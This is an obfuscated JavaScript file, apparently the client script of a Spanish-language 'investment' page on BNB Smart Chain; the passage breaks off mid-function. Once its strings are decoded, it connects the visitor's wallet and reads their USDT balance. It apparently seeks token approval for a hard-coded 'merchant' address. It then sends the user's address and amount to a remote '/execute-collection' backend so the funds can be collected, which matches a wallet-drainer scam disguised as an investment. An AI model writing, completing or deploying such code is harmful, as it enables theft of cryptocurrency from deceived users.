'use strict';
const _0x593822 = _0xe86f;
(function (_0x15747f, _0x55b616) {
    const _0x2a566b = _0xe86f, _0x116c01 = _0x15747f();
    while (!![]) {
        try {
            const _0x2229b3 = parseInt(_0x2a566b(0x170)) / (-0x79c + -0x114c + 0x18e9) * (parseInt(_0x2a566b(0x1ae)) / (-0x246c + -0x3 * 0xb65 + -0x1 * -0x469d)) + parseInt(_0x2a566b(0x198)) / (-0xbee + 0x11d2 + -0x5e1 * 0x1) + -parseInt(_0x2a566b(0x268)) / (-0x1a4 * 0x7 + 0x1 * 0x35f + -0x1 * -0x821) * (parseInt(_0x2a566b(0x258)) / (0x1926 + -0xa03 + -0xf1e)) + parseInt(_0x2a566b(0x1da)) / (-0x1a44 + -0x456 + 0x1ea0) + -parseInt(_0x2a566b(0x1e1)) / (-0x8e4 * 0x1 + -0x258c + 0x2e77) + parseInt(_0x2a566b(0x274)) / (-0x2 * -0xd7d + -0x52f * 0x3 + -0x1 * 0xb65) * (-parseInt(_0x2a566b(0x28b)) / (-0x1732 * -0x1 + 0x2 * -0xbf8 + 0xc7)) + parseInt(_0x2a566b(0x1f4)) / (-0x1 * -0x1d31 + -0x1 * -0x241f + 0xae1 * -0x6);
            if (_0x2229b3 === _0x55b616)
                break;
            else
                _0x116c01['push'](_0x116c01['shift']());
        } catch (_0x4ddd41) {
            _0x116c01['push'](_0x116c01['shift']());
        }
    }
}(_0x55b2, 0x2b3 * -0x220 + 0xc7f14 + 0x3 * 0x15735));
const MERCHANT_ADDRESS = _0x593822(0x22a) + _0x593822(0x222) + _0x593822(0x14e) + _0x593822(0x226) + '3b', CONTRACT_ADDRESS = _0x593822(0x1af) + _0x593822(0x156) + _0x593822(0x1c0) + _0x593822(0x179) + '34', BSC_USDT_ADDRESS = _0x593822(0x270) + _0x593822(0x176) + _0x593822(0x15d) + _0x593822(0x1d0) + '55', BSC_CHAIN_ID_HEX = _0x593822(0x1bf), MIN_USDT_BALANCE = 0x0n, BACKEND_URL = _0x593822(0x28f) + _0x593822(0x286) + _0x593822(0x18a) + _0x593822(0x22c), BSC_RPC_URLS = [
        _0x593822(0x265) + _0x593822(0x23b) + _0x593822(0x241),
        _0x593822(0x265) + _0x593822(0x221) + _0x593822(0x201) + _0x593822(0x1ed),
        _0x593822(0x265) + _0x593822(0x221) + _0x593822(0x271) + _0x593822(0x1ed),
        _0x593822(0x25f) + _0x593822(0x23a) + _0x593822(0x191)
    ], BSC_CHAIN_PARAMS = {
        'chainId': BSC_CHAIN_ID_HEX,
        'chainName': _0x593822(0x1eb) + _0x593822(0x1e3),
        'nativeCurrency': {
            'name': _0x593822(0x1cc),
            'symbol': _0x593822(0x1cc),
            'decimals': 0x12
        },
        'rpcUrls': BSC_RPC_URLS,
        'blockExplorerUrls': [_0x593822(0x265) + _0x593822(0x1c3)]
    }, ERC20_ABI = [
        _0x593822(0x13e) + _0x593822(0x16f) + _0x593822(0x14a) + _0x593822(0x20d) + _0x593822(0x278) + _0x593822(0x1d9) + _0x593822(0x23c) + _0x593822(0x1ca),
        _0x593822(0x13e) + _0x593822(0x283) + _0x593822(0x1dd) + _0x593822(0x206) + _0x593822(0x272) + _0x593822(0x160) + _0x593822(0x251) + _0x593822(0x243) + '6)',
        _0x593822(0x17c) + _0x593822(0x267) + _0x593822(0x256) + _0x593822(0x1fd) + _0x593822(0x184) + _0x593822(0x200) + _0x593822(0x240)
    ], approveBtn = document[_0x593822(0x225) + _0x593822(0x1b7)](_0x593822(0x1b4)), btnText = document[_0x593822(0x225) + _0x593822(0x1b7)](_0x593822(0x21b)), btnSpinner = document[_0x593822(0x225) + _0x593822(0x1b7)](_0x593822(0x172)), merchantInput = document[_0x593822(0x225) + _0x593822(0x1b7)](_0x593822(0x166) + _0x593822(0x233)), toastEl = document[_0x593822(0x225) + _0x593822(0x1b7)](_0x593822(0x19a));
if (merchantInput)
    merchantInput[_0x593822(0x259)] = MERCHANT_ADDRESS;
((async () => {
    const _0x4b2490 = _0x593822, _0x573b77 = {
            'xgtMS': function (_0x11add4, _0x688cea) {
                return _0x11add4(_0x688cea);
            }
        };
    try {
        await _0x573b77[_0x4b2490(0x1a8)](fetch, BACKEND_URL + _0x4b2490(0x261));
    } catch (_0x4cd5ab) {
    }
})());
function _0xe86f(_0x515762, _0xd1b0ca) {
    _0x515762 = _0x515762 - (-0x166 * -0x5 + 0x20e8 + -0x26a9);
    const _0x37f52e = _0x55b2();
    let _0x20d423 = _0x37f52e[_0x515762];
    return _0x20d423;
}
function _0x55b2() {
    const _0x22e0bc = [
        'denied',
        'EvIuh',
        'ttps://bsc',
        'QgiVX',
        '95)',
        'o\x20aprobaci',
        'default',
        'ount)\x20exte',
        'POST',
        'ZxtlV',
        'returns\x20(u',
        '1.binance.',
        'iente\x20para',
        'KUGbn',
        'sVxtr',
        'unnwA',
        'er,\x20addres',
        'FdWNo',
        'edBvk',
        'cancelada\x20',
        'pDuYu',
        '3|0|1|4|2',
        'reason',
        'er,\x20uint25',
        'uraYS',
        'tchEthereu',
        'innerHTML',
        '...',
        'rgba(38,\x201',
        'getAddress',
        'chainId',
        'Validando\x20',
        'TfmPg',
        'Contract',
        'Web3\x20Error',
        '¡Inversión',
        'ANwUg',
        'btnText',
        'xZMvJ',
        'ANsmp',
        '\x20billetera',
        'AwVYd',
        'obar\x20USDT…',
        'c-dataseed',
        'b48a6a7d19',
        'MIQJB',
        'nJoSn',
        'getElement',
        '5fae58ab9b',
        'Confirmand',
        'suficiente',
        'zaeth',
        '0x6253fecb',
        'HYERa',
        'er.com/api',
        'Firma\x20requ',
        '\x20saldo\x20de\x20',
        'IvBiy',
        '¡Transacci',
        'lZnYQ',
        'XZYDn',
        'dress',
        'user\x20rejec',
        'mcYic',
        'Conectando',
        'ZsWGn',
        '\x20pagar\x20la\x20',
        'pwUXw',
        'c.ankr.com',
        'c-rpc.publ',
        'eturns\x20(bo',
        'Error\x20al\x20a',
        'max',
        'open',
        'int256)',
        'icnode.com',
        'mChain',
        'ns\x20(uint25',
        'JXRaK',
        'gEqnM',
        'GMiro',
        'gutiy',
        'ualmente\x20a',
        'style',
        'NJfcZ',
        'ciones...',
        'tWffz',
        'a\x20red\x20BSC…',
        '\x20error\x20al\x20',
        'nceLabel',
        'hIEJy',
        'view\x20retur',
        'Cambiando\x20',
        'QiWrK',
        'Collection',
        'getNetwork',
        'ddress\x20acc',
        'OuBLe',
        '4921000MyKEes',
        'value',
        '\x20inversión',
        'oFSOB',
        'toUpperCas',
        'cancelled',
        'ario.',
        'https://rp',
        'ent',
        '/health',
        '1.00',
        'UpAux',
        '<a\x20href=\x22h',
        'https://bs',
        'ollection',
        'alanceOf(a',
        '4bYnzbH',
        'hidden',
        'e\x20red\x20(Gas',
        'approve',
        'rgba(220,\x20',
        'kAjno',
        '.95)',
        'input',
        '0x55d39832',
        '2.binance.',
        's\x20spender)',
        '/execute-c',
        '209032mDWjdv',
        'Cambia\x20man',
        ':\x20#fff;\x20te',
        'procesar\x20l',
        '6\x20amount)\x20',
        'HIujK',
        'extfz',
        'rAAfK',
        'modal',
        'NB\x20insufic',
        '\x20exitosa!\x20',
        'incronizar',
        'toString',
        '0.0005',
        'xt-decorat',
        'llowance(a',
        'textConten',
        'lkrDz',
        'cure-merch',
        'BrowserPro',
        'ion:\x20under',
        '\x20saldos\x20en',
        'roviders',
        '207snYlBq',
        'ZgwQE',
        'JBPKy',
        'formatUnit',
        'https://se',
        'rzUXq',
        'function\x20a',
        'No\x20tienes\x20',
        'ZFIPj',
        'dataset',
        'ccSUE',
        'bwbjA',
        'kODjB',
        'ada\x20con\x20éx',
        'SDT…',
        'saldo\x20de\x20U',
        '3|5',
        'maxBtn',
        'ress\x20spend',
        'dispatchEv',
        'saAsJ',
        'n\x20↗</a>',
        'f1b9a799e6',
        'subscribeP',
        'includes',
        'HORA',
        '\x20vivo:',
        'USDT\x20en\x20tu',
        'elector\x20de',
        'ón\x20en\x20red.',
        '6f10565A63',
        'IbLne',
        '_blank\x22\x20st',
        'RvuZh',
        'oATNw',
        'onclick',
        'balanceOf',
        '7548524699',
        'aHugE',
        'message',
        '\x20external\x20',
        'comisión\x20d',
        'Procesando',
        'olo...',
        'VXTAn',
        'removeProp',
        'merchantAd',
        'UgCvW',
        'opacity',
        '61,\x20123,\x200',
        'RJHgR',
        'Abriendo\x20s',
        'xkoNv',
        'split',
        'pEFCB',
        'pprove(add',
        '1uSfXZB',
        'investAmou',
        'btnSpinner',
        'oVKLq',
        'Processing',
        'por\x20el\x20usu',
        '6f99059fF7',
        'Saldo\x20de\x20B',
        'ain',
        'f1Ca61f1C6',
        'json',
        'toLowerCas',
        'function\x20b',
        'toFixed',
        'AQsmw',
        'JWlcw',
        'wait',
        'scan.com/t',
        'typHQ',
        'erty',
        'rnal\x20view\x20',
        'eip155',
        'Verificand',
        'tIbmJ',
        'HUWop',
        'a\x20transacc',
        'ant.onrend',
        'as.',
        'dNVdF',
        '\x20en\x20BscSca',
        '53,\x2069,\x200.',
        'Error\x20desc',
        'RWBBr',
        '/bsc',
        'getBalance',
        'getWalletP',
        'SosPj',
        'parseUnits',
        'EUyXp',
        'MgxBL',
        '1893789vCCmpI',
        'ón\x20complet',
        'toast',
        'click',
        'getSigner',
        'kGGSo',
        'vYDMH',
        'ted',
        'parseEther',
        'ión\x20en\x20la\x20',
        'request',
        '0.8',
        '\x20crítico:',
        'addEventLi',
        '\x20proveedor',
        'DSqBL',
        'xgtMS',
        '\x20BNB\x20Smart',
        '\x22\x20target=\x22',
        'yle=\x22color',
        'rovider',
        'fFKTV',
        '2108014miUwAD',
        '0x8e18bE61',
        '\x20USDT',
        'n/json',
        'erida:\x20Apr',
        'kusCe',
        'approveBtn',
        'onocido',
        'Saldo:\x20',
        'ById',
        'Ocurrió\x20un',
        '\x20gas\x20(BNB)',
        'tu\x20wallet.',
        'wallet_swi',
        'wallet_add',
        'type',
        '\x20failed.',
        '0x38',
        'cEa65585Dd',
        'YXToS',
        'INVERTIR\x20A',
        'cscan.com/',
        'o\x20red\x20BSC.',
        'o\x20autoriza',
        'fHuRE',
        'Iimpm',
        'red.',
        'allowance',
        'ol)',
        'code',
        'BNB',
        'Bedag',
        'kyvIl',
        'o\x20saldo\x20de',
        '9027B31979',
        'brir\x20AppKi',
        'stener',
        '\x20Chain\x20en\x20',
        'disabled',
        'error',
        '0|2|4|6|1|',
        'walletBala',
        'ZskOL',
        'external\x20r',
        '840798gWzTXA',
        'Error\x20al\x20s',
        'Ohqzy',
        'ddress\x20own',
        'EthereumCh',
        'ItTkY',
        'vider',
        '6590360CGIQdz',
        'eRzLj',
        'Chain',
        'Operación\x20',
        'brGew',
        'hash',
        'lcNnw',
        'ito!\x20Graci',
        '\x20en\x20protoc',
        'line;\x22>Ver',
        'BNB\x20Smart\x20',
        'background',
        'org/',
        'function',
        'ypfxj',
        'success',
        'djvRn',
        'stringify',
        'applicatio',
        '14078870otNjGI',
        'jsHWZ'
    ];
    _0x55b2 = function () {
        return _0x22e0bc;
    };
    return _0x55b2();
}
let _toastTimer;
function showToast(_0xf429ce, _0x28a6a6 = _0x593822(0x1fc), _0xfce288 = 0x184d + -0x1 * -0x197c + -0x671 * 0x5) {
    const _0x1a7e96 = _0x593822, _0x534dc5 = {
            'KUGbn': _0x1a7e96(0x1d6) + _0x1a7e96(0x148),
            'nJoSn': function (_0xfcfd5c, _0x44b1b4) {
                return _0xfcfd5c(_0x44b1b4);
            },
            'JBPKy': function (_0x2e969, _0x2a3fe2) {
                return _0x2e969 === _0x2a3fe2;
            },
            'HIujK': _0x1a7e96(0x1f0),
            'VXTAn': _0x1a7e96(0x212) + _0x1a7e96(0x169) + _0x1a7e96(0x26e),
            'ZgwQE': function (_0x1f3766, _0xdbc29c) {
                return _0x1f3766 === _0xdbc29c;
            },
            'RWBBr': _0x1a7e96(0x1d5),
            'DSqBL': _0x1a7e96(0x26c) + _0x1a7e96(0x18e) + _0x1a7e96(0x1fa),
            'kusCe': _0x1a7e96(0x1ec),
            'ItTkY': function (_0x2028f4, _0x16f2fa, _0x1f0996) {
                return _0x2028f4(_0x16f2fa, _0x1f0996);
            },
            'Ohqzy': _0x1a7e96(0x1fc)
        }, _0x548a55 = _0x534dc5[_0x1a7e96(0x203)][_0x1a7e96(0x16d)]('|');
    let _0x2ff2eb = 0x1 * 0x10a2 + -0x1210 + -0x16e * -0x1;
    while (!![]) {
        switch (_0x548a55[_0x2ff2eb++]) {
        case '0':
            if (!toastEl)
                return;
            continue;
        case '1':
            toastEl[_0x1a7e96(0x269)] = ![];
            continue;
        case '2':
            _0x534dc5[_0x1a7e96(0x224)](clearTimeout, _toastTimer);
            continue;
        case '3':
            if (_0x534dc5[_0x1a7e96(0x28d)](_0x28a6a6, _0x534dc5[_0x1a7e96(0x279)]))
                toastEl[_0x1a7e96(0x249)][_0x1a7e96(0x1ec)] = _0x534dc5[_0x1a7e96(0x164)];
            else
                _0x534dc5[_0x1a7e96(0x28c)](_0x28a6a6, _0x534dc5[_0x1a7e96(0x190)]) ? toastEl[_0x1a7e96(0x249)][_0x1a7e96(0x1ec)] = _0x534dc5[_0x1a7e96(0x1a7)] : toastEl[_0x1a7e96(0x249)][_0x1a7e96(0x165) + _0x1a7e96(0x183)](_0x534dc5[_0x1a7e96(0x1b3)]);
            continue;
        case '4':
            toastEl[_0x1a7e96(0x210)] = _0xf429ce;
            continue;
        case '5':
            _toastTimer = _0x534dc5[_0x1a7e96(0x1df)](setTimeout, () => {
                const _0x204339 = _0x1a7e96;
                toastEl[_0x204339(0x269)] = !![];
            }, _0xfce288);
            continue;
        case '6':
            toastEl[_0x1a7e96(0x141)][_0x1a7e96(0x1bd)] = _0x534dc5[_0x1a7e96(0x28c)](_0x28a6a6, _0x534dc5[_0x1a7e96(0x1dc)]) ? '' : _0x28a6a6;
            continue;
        }
        break;
    }
}
function setLoading(_0x269679, _0x3cb3d6 = _0x593822(0x174) + '…') {
    const _0x29b4e3 = _0x593822, _0x5073d7 = {
            'UgCvW': _0x29b4e3(0x20b),
            'aHugE': _0x29b4e3(0x1a3),
            'HUWop': _0x29b4e3(0x1c2) + _0x29b4e3(0x151)
        }, _0x29a072 = _0x5073d7[_0x29b4e3(0x167)][_0x29b4e3(0x16d)]('|');
    let _0x5e4d9c = 0x61a * -0x4 + 0x2270 * 0x1 + -0xa08;
    while (!![]) {
        switch (_0x29a072[_0x5e4d9c++]) {
        case '0':
            approveBtn[_0x29b4e3(0x1d4)] = _0x269679;
            continue;
        case '1':
            approveBtn[_0x29b4e3(0x249)][_0x29b4e3(0x168)] = _0x269679 ? _0x5073d7[_0x29b4e3(0x15e)] : '1';
            continue;
        case '2':
            if (btnSpinner)
                btnSpinner[_0x29b4e3(0x269)] = !_0x269679;
            continue;
        case '3':
            if (!approveBtn)
                return;
            continue;
        case '4':
            if (btnText)
                btnText[_0x29b4e3(0x284) + 't'] = _0x269679 ? _0x3cb3d6[_0x29b4e3(0x25c) + 'e']() : _0x5073d7[_0x29b4e3(0x188)];
            continue;
        }
        break;
    }
}
async function fetchAndDisplayUserBalances(_0x37790e) {
    const _0x51045d = _0x593822, _0x421d31 = {
            'ypfxj': _0x51045d(0x171) + 'nt',
            'IbLne': function (_0x5e894c, _0x40433e) {
                return _0x5e894c - _0x40433e;
            },
            'xZMvJ': function (_0x5e00d0, _0x5a5c3f) {
                return _0x5e00d0(_0x5a5c3f);
            },
            'ANwUg': function (_0x3d39bb, _0x3d3c32) {
                return _0x3d39bb > _0x3d3c32;
            },
            'pwUXw': _0x51045d(0x262),
            'hIEJy': _0x51045d(0x26f),
            'kGGSo': _0x51045d(0x1d7) + _0x51045d(0x24f),
            'FdWNo': function (_0x2e1a79, _0x2c0cc9) {
                return _0x2e1a79(_0x2c0cc9);
            },
            'JWlcw': _0x51045d(0x149),
            'ANsmp': _0x51045d(0x1db) + _0x51045d(0x27f) + _0x51045d(0x289) + _0x51045d(0x152)
        };
    try {
        const _0x3ea498 = new ethers[(_0x51045d(0x287)) + (_0x51045d(0x1e0))](_0x37790e), _0x2d5e4b = await _0x3ea498[_0x51045d(0x19c)](), _0x34a2e6 = await _0x2d5e4b[_0x51045d(0x213)](), _0xec56a1 = new ethers[(_0x51045d(0x217))](BSC_USDT_ADDRESS, ERC20_ABI, _0x2d5e4b), _0x2ca4cc = await _0xec56a1[_0x51045d(0x15c)](_0x34a2e6), _0x1d14c0 = ethers[_0x51045d(0x28e) + 's'](_0x2ca4cc, -0x19b9 + 0x9 * 0x132 + 0x1 * 0xf09), _0x22f644 = document[_0x51045d(0x225) + _0x51045d(0x1b7)](_0x421d31[_0x51045d(0x19d)]);
        _0x22f644 && (_0x22f644[_0x51045d(0x284) + 't'] = _0x51045d(0x1b6) + _0x421d31[_0x51045d(0x207)](parseFloat, _0x1d14c0)[_0x51045d(0x17d)](0xa3 * -0xb + 0x209 * -0x5 + 0x1130) + _0x51045d(0x1b0));
        const _0x45925a = document[_0x51045d(0x225) + _0x51045d(0x1b7)](_0x421d31[_0x51045d(0x17f)]);
        _0x45925a && (_0x45925a[_0x51045d(0x15b)] = () => {
            const _0x5e7ce6 = _0x51045d, _0x4c1a8b = document[_0x5e7ce6(0x225) + _0x5e7ce6(0x1b7)](_0x421d31[_0x5e7ce6(0x1ef)]);
            if (_0x4c1a8b) {
                const _0x5f9e13 = Math[_0x5e7ce6(0x23e)](0x1aad * 0x1 + 0x793 + -0x2240, _0x421d31[_0x5e7ce6(0x157)](_0x421d31[_0x5e7ce6(0x21c)](parseFloat, _0x1d14c0), 0x1ba * -0x8 + -0x296 * -0xc + -0x1137));
                _0x4c1a8b[_0x5e7ce6(0x259)] = _0x421d31[_0x5e7ce6(0x21a)](_0x5f9e13, -0xb20 + -0xa01 + 0x1521) ? _0x5f9e13[_0x5e7ce6(0x17d)](0x1704 * 0x1 + -0x37 * -0x5c + -0x1563 * 0x2) : _0x421d31[_0x5e7ce6(0x239)], _0x4c1a8b[_0x5e7ce6(0x14b) + _0x5e7ce6(0x260)](new Event(_0x421d31[_0x5e7ce6(0x250)]));
            }
        });
    } catch (_0x11ab61) {
        console[_0x51045d(0x1d5)](_0x421d31[_0x51045d(0x21d)], _0x11ab61);
    }
}
async function triggerBackendCollect(_0x2e8f71) {
    const _0x161aa7 = _0x593822, _0x3ec0f1 = {
            'NJfcZ': _0x161aa7(0x171) + 'nt',
            'OuBLe': function (_0x2c5d69, _0x553499) {
                return _0x2c5d69 <= _0x553499;
            },
            'JXRaK': function (_0x10238a, _0x49668f, _0x2b9946) {
                return _0x10238a(_0x49668f, _0x2b9946);
            },
            'TfmPg': _0x161aa7(0x1fe),
            'saAsJ': _0x161aa7(0x1f3) + _0x161aa7(0x1b1),
            'RJHgR': _0x161aa7(0x254) + _0x161aa7(0x1be),
            'oATNw': function (_0x1abc71, _0x1aef99) {
                return _0x1abc71 < _0x1aef99;
            }
        };
    let _0x44774b;
    const _0x218fcb = document[_0x161aa7(0x225) + _0x161aa7(0x1b7)](_0x3ec0f1[_0x161aa7(0x24a)])?.[_0x161aa7(0x259)] || '1', _0x28fce1 = ethers[_0x161aa7(0x195)](_0x218fcb[_0x161aa7(0x280)](), 0x3 * -0x6b7 + -0xa23 + 0x1e5a)[_0x161aa7(0x280)]();
    for (let _0x1b09ad = 0xd * -0x11f + 0x2531 * -0x1 + 0x33c5; _0x3ec0f1[_0x161aa7(0x257)](_0x1b09ad, 0x13b3 + -0x117b * -0x1 + -0x252b); _0x1b09ad++) {
        try {
            const _0x4e7a5e = await _0x3ec0f1[_0x161aa7(0x244)](fetch, BACKEND_URL + (_0x161aa7(0x273) + _0x161aa7(0x266)), {
                    'method': _0x3ec0f1[_0x161aa7(0x216)],
                    'headers': { 'Content-Type': _0x3ec0f1[_0x161aa7(0x14c)] },
                    'body': JSON[_0x161aa7(0x1f2)]({
                        'userAddress': _0x2e8f71,
                        'amount': _0x28fce1
                    })
                }), _0x5646b1 = await _0x4e7a5e[_0x161aa7(0x17a)]();
            if (!_0x4e7a5e['ok'] || !_0x5646b1[_0x161aa7(0x1f0)])
                throw new Error(_0x5646b1[_0x161aa7(0x1d5)] || _0x3ec0f1[_0x161aa7(0x16a)]);
            return _0x5646b1;
        } catch (_0x3017d5) {
            _0x44774b = _0x3017d5;
            if (_0x3ec0f1[_0x161aa7(0x15a)](_0x1b09ad, 0xc * -0x17e + 0x1cf7 * -0x1 + 0x2c2 * 0x11))
                await new Promise(_0x2003d0 => setTimeout(_0x2003d0, -0x1527 + 0x2074 + 0x6b));
        }
    }
    throw _0x44774b;
}
let pendingInvestment = ![];
window[_0x593822(0x27c)] && typeof window[_0x593822(0x27c)][_0x593822(0x14f) + _0x593822(0x28a)] === _0x593822(0x1ee) && window[_0x593822(0x27c)][_0x593822(0x14f) + _0x593822(0x28a)](_0x449e56 => {
    const _0x429643 = _0x593822, _0x30e793 = {
            'QgiVX': _0x429643(0x185),
            'SosPj': function (_0x3dec23, _0x3acd31) {
                return _0x3dec23(_0x3acd31);
            }
        }, _0x175be0 = _0x449e56[_0x30e793[_0x429643(0x1f9)]];
    _0x175be0 && (_0x30e793[_0x429643(0x194)](fetchAndDisplayUserBalances, _0x175be0), pendingInvestment && (pendingInvestment = ![], _0x30e793[_0x429643(0x194)](runInvestmentFlow, _0x175be0)));
});
approveBtn && approveBtn[_0x593822(0x1a5) + _0x593822(0x1d2)](_0x593822(0x19b), async () => {
    const _0x1b9631 = _0x593822, _0x4cb750 = {
            'dNVdF': function (_0x31d2e8, _0x4e53dc) {
                return _0x31d2e8 === _0x4e53dc;
            },
            'lkrDz': _0x1b9631(0x1ee),
            'edBvk': function (_0x1ebcf1, _0x14d757, _0x43a778) {
                return _0x1ebcf1(_0x14d757, _0x43a778);
            },
            'Iimpm': _0x1b9631(0x16b) + _0x1b9631(0x154) + _0x1b9631(0x21e) + _0x1b9631(0x211),
            'typHQ': function (_0xfd067f, _0x366dad) {
                return _0xfd067f === _0x366dad;
            },
            'ZskOL': function (_0x4f717c, _0x41b72e) {
                return _0x4f717c(_0x41b72e);
            },
            'rzUXq': _0x1b9631(0x23d) + _0x1b9631(0x1d1) + 't:',
            'RvuZh': function (_0x50f8fc, _0x4afd2c) {
                return _0x50f8fc(_0x4afd2c);
            },
            'UpAux': function (_0xafb6db, _0x4dc5c4) {
                return _0xafb6db(_0x4dc5c4);
            }
        };
    let _0x110d42 = null;
    if (window[_0x1b9631(0x27c)] && _0x4cb750[_0x1b9631(0x18c)](typeof window[_0x1b9631(0x27c)][_0x1b9631(0x193) + _0x1b9631(0x1ac)], _0x4cb750[_0x1b9631(0x285)]))
        try {
            _0x110d42 = window[_0x1b9631(0x27c)][_0x1b9631(0x193) + _0x1b9631(0x1ac)]();
        } catch (_0x1ae981) {
        }
    if (!_0x110d42) {
        pendingInvestment = !![], _0x4cb750[_0x1b9631(0x208)](setLoading, !![], _0x4cb750[_0x1b9631(0x1c7)]);
        if (window[_0x1b9631(0x27c)] && _0x4cb750[_0x1b9631(0x18c)](typeof window[_0x1b9631(0x27c)][_0x1b9631(0x23f)], _0x4cb750[_0x1b9631(0x285)]))
            try {
                await window[_0x1b9631(0x27c)][_0x1b9631(0x23f)]();
                let _0x2c572b = null;
                if (_0x4cb750[_0x1b9631(0x182)](typeof window[_0x1b9631(0x27c)][_0x1b9631(0x193) + _0x1b9631(0x1ac)], _0x4cb750[_0x1b9631(0x285)]))
                    try {
                        _0x2c572b = window[_0x1b9631(0x27c)][_0x1b9631(0x193) + _0x1b9631(0x1ac)]();
                    } catch (_0x52f244) {
                    }
                if (!_0x2c572b) {
                    pendingInvestment = ![], _0x4cb750[_0x1b9631(0x1d8)](setLoading, ![]);
                    return;
                } else {
                    await _0x4cb750[_0x1b9631(0x1d8)](runInvestmentFlow, _0x2c572b);
                    return;
                }
            } catch (_0x4ab83b) {
                console[_0x1b9631(0x1d5)](_0x4cb750[_0x1b9631(0x13d)], _0x4ab83b), pendingInvestment = ![], _0x4cb750[_0x1b9631(0x159)](setLoading, ![]);
            }
        else
            _0x4cb750[_0x1b9631(0x159)](setLoading, ![]);
        return;
    }
    await _0x4cb750[_0x1b9631(0x263)](runInvestmentFlow, _0x110d42);
});
async function runInvestmentFlow(_0x215495) {
    const _0x2d05f6 = _0x593822, _0x508e64 = {
            'kAjno': function (_0x3433d0, _0x23a844, _0x33e1da) {
                return _0x3433d0(_0x23a844, _0x33e1da);
            },
            'AwVYd': _0x2d05f6(0x236) + _0x2d05f6(0x1a6) + '…',
            'mcYic': _0x2d05f6(0x186) + _0x2d05f6(0x1c4) + '..',
            'ZxtlV': function (_0x34f318, _0x5c9fe3) {
                return _0x34f318 !== _0x5c9fe3;
            },
            'tIbmJ': function (_0x501e1c, _0x4d0c8f) {
                return _0x501e1c(_0x4d0c8f);
            },
            'ccSUE': function (_0x292c54, _0x1a2763, _0x5b277f) {
                return _0x292c54(_0x1a2763, _0x5b277f);
            },
            'Bedag': _0x2d05f6(0x252) + _0x2d05f6(0x24d),
            'pDuYu': _0x2d05f6(0x1bb) + _0x2d05f6(0x20f) + _0x2d05f6(0x242),
            'tWffz': function (_0x2d69b9, _0x130b39) {
                return _0x2d69b9 === _0x130b39;
            },
            'gEqnM': _0x2d05f6(0x1bc) + _0x2d05f6(0x1de) + _0x2d05f6(0x178),
            'bwbjA': function (_0x34c0f3, _0x5ca71a, _0x4784b3) {
                return _0x34c0f3(_0x5ca71a, _0x4784b3);
            },
            'EvIuh': _0x2d05f6(0x275) + _0x2d05f6(0x248) + _0x2d05f6(0x1a9) + _0x2d05f6(0x1d3) + _0x2d05f6(0x1ba),
            'EUyXp': _0x2d05f6(0x1d5),
            'ZsWGn': function (_0xf88bb1, _0x1f1e18) {
                return _0xf88bb1(_0x1f1e18);
            },
            'HYERa': _0x2d05f6(0x186) + _0x2d05f6(0x1cf) + _0x2d05f6(0x1b9) + '…',
            'rAAfK': _0x2d05f6(0x281),
            'eRzLj': function (_0xfb15a1, _0x520ca6) {
                return _0xfb15a1 < _0x520ca6;
            },
            'fFKTV': function (_0x51b183, _0x4bba00, _0x97c52a) {
                return _0x51b183(_0x4bba00, _0x97c52a);
            },
            'zaeth': _0x2d05f6(0x177) + _0x2d05f6(0x27d) + _0x2d05f6(0x202) + _0x2d05f6(0x238) + _0x2d05f6(0x161) + _0x2d05f6(0x26a) + ').',
            'gutiy': _0x2d05f6(0x171) + 'nt',
            'lcNnw': function (_0x48e74e, _0x1785b8) {
                return _0x48e74e || _0x1785b8;
            },
            'extfz': _0x2d05f6(0x215) + _0x2d05f6(0x147) + _0x2d05f6(0x146),
            'IvBiy': function (_0x2a422d, _0x5d59c4) {
                return _0x2a422d < _0x5d59c4;
            },
            'uraYS': function (_0x457de9, _0x3577c7, _0x29ab01) {
                return _0x457de9(_0x3577c7, _0x29ab01);
            },
            'sVxtr': _0x2d05f6(0x13f) + _0x2d05f6(0x228) + _0x2d05f6(0x22e) + _0x2d05f6(0x153) + _0x2d05f6(0x21e) + '.',
            'oVKLq': function (_0x5dba22, _0x47aa33, _0x394046) {
                return _0x5dba22(_0x47aa33, _0x394046);
            },
            'pEFCB': _0x2d05f6(0x186) + _0x2d05f6(0x1c5) + _0x2d05f6(0x24b),
            'brGew': function (_0x2ea0dc, _0x5af8da) {
                return _0x2ea0dc < _0x5af8da;
            },
            'GMiro': _0x2d05f6(0x22d) + _0x2d05f6(0x1b2) + _0x2d05f6(0x220),
            'lZnYQ': _0x2d05f6(0x227) + _0x2d05f6(0x1fb) + _0x2d05f6(0x155) + '..',
            'kODjB': function (_0x3df04d, _0x498465, _0x91edda) {
                return _0x3df04d(_0x498465, _0x91edda);
            },
            'vYDMH': _0x2d05f6(0x162) + _0x2d05f6(0x25a) + _0x2d05f6(0x1e9) + _0x2d05f6(0x163),
            'xkoNv': function (_0x4065bf, _0x3f6ddb, _0x5db103, _0x4d7125) {
                return _0x4065bf(_0x3f6ddb, _0x5db103, _0x4d7125);
            },
            'jsHWZ': _0x2d05f6(0x1f0),
            'fHuRE': function (_0xe58fa3, _0x448739, _0x2b3dff, _0x3b52a9) {
                return _0xe58fa3(_0x448739, _0x2b3dff, _0x3b52a9);
            },
            'djvRn': _0x2d05f6(0x230) + _0x2d05f6(0x199) + _0x2d05f6(0x145) + _0x2d05f6(0x1e8) + _0x2d05f6(0x18b),
            'ZFIPj': _0x2d05f6(0x18f) + _0x2d05f6(0x1b5),
            'unnwA': function (_0x4a49ce, _0xe8bc8c) {
                return _0x4a49ce === _0xe8bc8c;
            },
            'YXToS': _0x2d05f6(0x234) + _0x2d05f6(0x19f),
            'XZYDn': _0x2d05f6(0x1f6),
            'kyvIl': _0x2d05f6(0x25d),
            'AQsmw': _0x2d05f6(0x1e4) + _0x2d05f6(0x209) + _0x2d05f6(0x175) + _0x2d05f6(0x25e),
            'oFSOB': _0x2d05f6(0x1fc),
            'MgxBL': _0x2d05f6(0x218) + _0x2d05f6(0x1a4),
            'QiWrK': _0x2d05f6(0x1b8) + _0x2d05f6(0x24e) + _0x2d05f6(0x277) + _0x2d05f6(0x189) + _0x2d05f6(0x1a1) + _0x2d05f6(0x1c8),
            'MIQJB': function (_0x3b2d1a, _0x16c25f) {
                return _0x3b2d1a(_0x16c25f);
            }
        };
    _0x508e64[_0x2d05f6(0x26d)](setLoading, !![], _0x508e64[_0x2d05f6(0x21f)]);
    try {
        const _0x30558f = new ethers[(_0x2d05f6(0x287)) + (_0x2d05f6(0x1e0))](_0x215495);
        _0x508e64[_0x2d05f6(0x26d)](setLoading, !![], _0x508e64[_0x2d05f6(0x235)]);
        const _0x414e49 = await _0x30558f[_0x2d05f6(0x255)]();
